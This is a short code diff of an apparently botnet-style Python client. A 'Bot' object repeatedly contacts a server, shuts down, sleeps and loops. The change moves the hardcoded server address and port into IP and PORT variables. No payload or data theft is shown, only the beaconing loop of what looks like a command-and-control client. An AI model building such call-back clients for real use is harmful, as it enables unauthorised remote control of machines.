@@ -10,8 +10,9 @@ from time import sleep
 from lib import shell, session
 from os import getcwd, path, chdir
 
-# wait before calling server
-# sleep(30)
+# address
+IP = '127.0.0.1'
+PORT = '8080'
 
 # cert path
 config = {
@@ -94,7 +95,7 @@ if  __name__ == '__main__':
  while True:
   chdir(home)
   bot = Bot(home)
-  bot.contact_server('127.0.0.1', 8080)
+  bot.contact_server(IP, int(PORT))
   bot.shutdown()
   try:sleep(10)
   except:break
